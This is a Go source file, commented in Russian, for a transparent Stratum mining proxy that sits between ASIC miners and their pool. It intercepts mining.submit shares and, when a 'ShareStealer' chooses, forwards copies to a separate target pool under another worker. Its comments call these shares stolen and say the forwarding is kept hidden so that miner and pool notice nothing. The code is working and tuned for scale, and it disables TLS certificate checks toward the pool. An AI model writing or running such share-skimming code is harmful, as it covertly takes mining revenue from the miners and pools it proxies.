package proxy

import (
	"bufio"
	"crypto/tls"
	"io"
	"log"
	"net"
	"time"
)

// idleTimeout — таймаут неактивности ASIC-сессии. Если от майнера не пришло
// данных дольше этого времени — соединение разрывается (ASIC «умер»), ресурсы
// освобождаются. Требование заказчика: сброс «умершей» сессии ~10 минут.
const idleTimeout = 10 * time.Minute

// upstreamDialTimeout — таймаут установки TCP/TLS соединения с реальным пулом.
const upstreamDialTimeout = 10 * time.Second

// HandleConnection обрабатывает одно соединение от ASIC-майнера.
//
// Схема:
//   майнер <---> мы <---> реальный пул (upstream)
//                    |
//                    +--> целевой пул (украденные шары)
//
// Вся работа прозрачна: майнер и пул общаются как обычно, разница в том,
// что ДО отправки каждой шары реальному пулу мы можем скопировать её
// целевому пулу (с другим воркером) — это и есть «откусывание».
func HandleConnection(clientConn net.Conn, upstreamAddr string, upstreamSSL bool, stealer *ShareStealer) {
	// При выходе закрываем соединение клиента (TCP-сессия завершается).
	defer clientConn.Close()

	// Подключаемся к реальному (upstream) пулу. Обычный TCP или TLS.
	// InsecureSkipVerify=true — публичные пулы часто используют самоподписанные
	// сертификаты; это рабочее, но небезопасное допущение (пул видит наш трафик).
	var upstream net.Conn
	var err error
	if upstreamSSL {
		upstream, err = tls.Dial("tcp", upstreamAddr, &tls.Config{
			InsecureSkipVerify: true,
		})
	} else {
		upstream, err = net.DialTimeout("tcp", upstreamAddr, upstreamDialTimeout)
	}
	if err != nil {
		log.Printf("[CONN] upstream dial %s: %v", upstreamAddr, err)
		return
	}
	defer upstream.Close()

	log.Printf("[CONN] %s <-> %s", clientConn.RemoteAddr(), upstreamAddr)

	// Запускаем два потока копирования:
	//   1) майнер -> пул   — с перехватом mining.submit (может «укусить»);
	//   2) пул -> майнер   — без перехвата, просто проброс ответов.
	//
	// Канал done нужен, чтобы закончить связку, когда ОДИН из потоков
	// завершится (например, разрыв соединения). Тогда второй поток тоже
	// завершается через defer'ы/закрытие соединений.
	done := make(chan struct{}, 2)

	// Поток 1: майнер -> пул (с перехватом шар).
	go func() {
		pipeMinerToPool(clientConn, upstream, stealer)
		done <- struct{}{}
	}()

	// Поток 2: пул -> майнер (простой passthrough).
	go func() {
		// io.Copy вернётся при закрытии clientConn (после таймаута в pipeMinerToPool
		// или обрыве upstream). Записываем результат для диагностики.
		if _, err := io.Copy(clientConn, upstream); err != nil {
			log.Printf("[CONN] pool->miner copy: %v", err)
		}
		done <- struct{}{}
	}()

	// Ждём завершения любого из потоков — это означает разрыв соединения.
	<-done
	log.Printf("[DISCONNECT] %s", clientConn.RemoteAddr())
}

// pipeMinerToPool копирует данные от майнера к пулу построчно.
// Stratum V1 использует JSON-RPC: каждое сообщение = одна строка с '\n'.
// Для каждой строки решаем: это mining.submit (шара)? Если да и stealer
// решил «укусить» — копия уходит целевому пулу, оригинал ВСЕГДА идёт
// реальному (чтобы майнер и пул ничего не заметили).
func pipeMinerToPool(src, dst net.Conn, stealer *ShareStealer) {
	// Сканер читает строки. Stratum V1 JSON редко бывает больше 1КБ, поэтому
	// буфер 4КБ с запасом на 16КБ заменяет прежние 64КБ — при 20k соединений
	// это заметная экономия памяти (20k × 64КБ = 1.2ГБ против 20k × 16КБ = 320МБ).
	// Если строка превышает maxBuffer — Scanner вернёт ErrTooLong и разорвёт
	// соединение (аномалия, не теряем ничего полезного).
	const (
		initBuffer = 4 * 1024
		maxBuffer  = 16 * 1024
	)
	scanner := bufio.NewScanner(src)
	scanner.Buffer(make([]byte, initBuffer), maxBuffer)

	// Таймаут чтения: если майнер «молчит» дольше idleTimeout (ASIC умер,
	// кабель отвалился) — Read вернёт таймаут и соединение закроется.
	// Deadline обновляется при каждом успешном чтении строки.
	src.SetReadDeadline(time.Now().Add(idleTimeout))

	for scanner.Scan() {
		// Получили данные — отодвигаем таймаут неактивности ещё на idleTimeout.
		src.SetReadDeadline(time.Now().Add(idleTimeout))

		line := scanner.Bytes()

		// Scanner переиспользует буфер, поэтому сохраняем КОПИЮ строки —
		// она может понадобиться в отдельной goroutine (асинхронная отправка).
		lineCopy := make([]byte, len(line))
		copy(lineCopy, line)

		// Отправляем в реальный пул. Оригинал ВСЕГДА уходит — иначе майнер
		// получит не-ответ на свой submit и сорвёт соединение. Для submit-ов
		// дополнительно решаем, не «укусить» ли копию в целевой пул.
		if IsMinerSubmit(lineCopy) {
			// Это шapa. Спрашиваем у stealer: красть или нет?
			if stealer.ShouldSteal() {
				// Крадём КОПИЮ: она уходит целевому пулу в своей goroutine,
				// чтобы не блокировать основной поток майнер->пул.
				go func(data []byte) {
					if err := stealer.ForwardToTarget(data); err != nil {
						log.Printf("[REDIRECT] forward to target: %v", err)
					}
				}(lineCopy)
			}
		}

		if err := writeLine(dst, lineCopy); err != nil {
			log.Printf("[CONN] write to upstream: %v", err)
			return
		}
	}

	if err := scanner.Err(); err != nil {
		// При превышении idleTimeout ловим таймаут и закрываем «умершую» сессию.
		if ne, ok := err.(net.Error); ok && ne.Timeout() {
			log.Printf("[CONN] idle timeout, closing session: %s", src.RemoteAddr())
		} else if err == bufio.ErrTooLong {
			log.Printf("[CONN] oversized stratum line, closing: %s", src.RemoteAddr())
		} else {
			log.Printf("[CONN] scanner: %v", err)
		}
	}
}

// writeLine пишет данные и терминальный '\n' в dst.
// Используется вместо append(), чтобы не мутировать общий буфер scanner.
func writeLine(dst io.Writer, data []byte) error {
	buf := make([]byte, 0, len(data)+1)
	buf = append(buf, data...)
	buf = append(buf, '\n')
	_, err := dst.Write(buf)
	return err
}
